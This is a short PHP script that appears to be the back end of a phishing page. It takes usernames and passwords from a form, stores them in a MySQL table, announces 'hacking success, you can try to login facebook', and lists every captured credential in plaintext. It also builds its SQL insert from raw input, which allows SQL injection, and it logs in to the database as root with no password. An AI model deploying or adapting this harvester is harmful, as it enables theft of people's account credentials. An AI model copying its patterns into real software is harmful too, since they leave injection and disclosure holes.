<?php
$link = mysqli_connect("localhost","root","","shping");
mysqli_select_db($link,"shping");
?>
<?php
if (isset($_POST['submit'])) {
    $user_name = $_POST['name'] ;
    $password = $_POST['password'];
    $repassword = $_POST['re_password'];

    echo "$user_name";
    echo "$password";
}
?>

<?php

$inset = "INSERT INTO upload_product_1(name, prize) VALUES ('$user_name','$password')";
if (mysqli_query($link,$inset)){
    echo "hacking success,you can try to login facebook <br>";

}
?>

<?php
$query = "select * from upload_product_1";
$table = mysqli_query($link,$query);
while ($row = mysqli_fetch_array($table)){
    ?>
    <tr>
        <td>
            <?php echo "User_name:". ucwords($row['name']);?>
            ---------
            <?php echo "Password:".$row['prize']; ?> <br><hr>
        </td>
    </tr>


    <?php
}
?>

